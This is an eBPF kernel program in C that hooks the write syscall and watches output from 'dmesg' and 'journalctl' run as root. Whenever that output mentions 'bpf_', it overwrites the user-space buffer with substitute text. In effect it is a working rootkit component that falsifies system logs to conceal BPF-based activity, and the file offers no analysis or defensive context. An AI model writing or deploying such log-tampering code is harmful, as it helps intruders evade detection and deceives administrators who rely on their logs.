//go:build ignore
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define MAX_BUF 200
#define TARGET "bpf_"
#define TARGET_LEN (sizeof(TARGET) - 1)
#define PATCH_KEY 0

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[MAX_BUF]);
} patch_map SEC(".maps");

SEC("kprobe/__x64_sys_write")
int BPF_KPROBE(trace_write)
{
    struct pt_regs *real_regs = PT_REGS_SYSCALL_REGS(ctx);

    u32 uid = (u32)bpf_get_current_uid_gid();
    if (uid != 0)
        return 0;

    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));

    if (__builtin_strncmp(comm, "dmesg", 5) != 0 &&
        __builtin_strncmp(comm, "journalctl", 10) != 0) {
        return 0;
    }

    const char *buf = (const char *)PT_REGS_PARM2_CORE_SYSCALL(real_regs);
    u64 count = PT_REGS_PARM3_CORE_SYSCALL(real_regs);

    if (count <= 0 || buf == NULL)
        return 0;
    count = count > MAX_BUF ? MAX_BUF : count;

    char data[MAX_BUF] = {};
    if (bpf_core_read_user_str(&data, count, buf) < 0)
        return 0;

    u32 key = PATCH_KEY;
    char *patch = bpf_map_lookup_elem(&patch_map, &key);
    if (!patch)
        return 0;

    u32 limit = count > TARGET_LEN ? count - TARGET_LEN : 0;
    for (u32 i = 0; i < limit; i++) {
        if (__builtin_memcmp(&data[i], TARGET, TARGET_LEN) == 0) {
            bpf_probe_write_user((void *)buf, patch, count);
            return 0;
        }
    }

    return 0;
}
char LICENSE[] SEC("license") = "GPL";